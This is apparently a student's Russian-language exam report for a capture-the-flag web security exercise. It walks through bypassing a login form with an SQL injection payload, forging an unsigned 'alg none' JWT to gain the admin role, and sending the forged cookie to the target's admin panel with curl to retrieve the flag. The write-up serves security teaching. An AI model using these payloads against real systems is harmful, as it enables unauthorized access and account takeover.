# Exam-Information-Security
Задание по экзамену "Обеспечение защиты процессов разработки (углубленный)"
Бачурин Матвей Владимирович, М4105

## Отчет о выполнении задания
### Цель
Получить флаг, перейдя в административную панель веб-приложения по адресу http://89.169.160.128:8080/admin, используя уязвимости SQL-инъекции и подделки JWT-токенов.
### Выполненные действия
#### Шаг 1. Обход аутентификации с помощью SQL-инъекции

Действие: В поле ввода имени пользователя на странице входа была вставлена следующая полезная нагрузка:

```sql
' OR 1=1 LIMIT 1 --
```
Объяснение: Эта инъекция модифицирует SQL-запрос, который проверяет учетные данные. Вместо поиска конкретного пользователя, условие OR 1=1 делает запрос всегда истинным, а LIMIT 1 ограничивает результат одной записью (первым пользователем в базе данных). Символы -- комментируют оставшуюся часть запроса, включая проверку пароля.

Результат: Инъекция позволила войти в систему без знания пароля под первым пользователем в базе данных — student (студент).

#### Шаг 2. Анализ и подделка JWT-токена

Действие: После входа была предпринята попытка перейти в раздел /admin, которая завершилась ошибкой 403 Forbidden. В заголовках запроса был обнаружен JWT-токен, отвечающий за авторизацию:

```text
auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJzdHVkZW50IiwibmFtZSI6IklUTU8gU3R1ZGVudCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzgxOTY2ODIyfQ.
```
Объяснение: Токен был декодирован. Первая часть (header) содержит информацию об алгоритме:

```json
{"alg":"none","typ":"JWT"}
```
Это указывает на использование алгоритма none, что означает, что подпись токена отсутствует и не проверяется сервером. Вторая часть (payload) содержит данные о пользователе:

```json
{"sub":"1","username":"student","name":"ITMO Student","role":"user","iat":1781966822}
```
Так как токен не защищен подписью, его содержимое можно произвольно изменить.

Результат: Был создан поддельный токен. В исходном payload поля "username" и "role" были изменены на "admin". Новый payload был закодирован обратно в формат Base64, и на его основе собран новый токен.

#### Шаг 3. Доступ к административной панели с поддельным токеном

Действие: Запрос к эндпоинту /admin был отправлен повторно, но с использованием поддельного JWT-токена в заголовке Cookie.

```bash
curl -X GET "http://89.169.160.128:8080/admin" -H "cookie: auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiIsIm5hbWUiOiJJVE1PIFN0dWRlbnQiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODE5NjY4MjJ9."
```
Объяснение: Сервер, не проверяя подпись токена, доверился измененным данным в payload и идентифицировал пользователя как администратора.

Результат: Сервер вернул HTML-страницу административной панели, содержащую искомый флаг:

```html
<h1>Admin area</h1>
<p>Flag in <code>ITMO{...}</code> format:</p>
<pre>ITMO{sql_injection_to_unsigned_jwt_admin}</pre>
```
#### Итоговый флаг
```text
ITMO{sql_injection_to_unsigned_jwt_admin}
```
